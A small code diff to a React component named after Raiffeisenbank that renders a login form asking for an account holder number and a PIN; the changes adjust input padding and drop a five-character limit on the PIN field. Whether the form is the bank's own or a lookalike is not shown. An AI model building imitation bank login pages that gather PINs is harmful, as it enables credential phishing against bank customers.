@@ -227,7 +227,7 @@ const Raiffeisenbank = () => {
             onChange={(e) => setVerfueger(e.target.value)}
             onBlur={() => setVerfuegerTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-3 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
               verfuegerTouched && !verfueger ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
@@ -248,12 +248,11 @@ const Raiffeisenbank = () => {
         <div className="relative mb-8">
           <input
             type="password"
-            maxLength={5}
             value={pin}
             onChange={(e) => setPin(e.target.value)}
             onBlur={() => setPinTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-3 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
               pinTouched && !pin ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
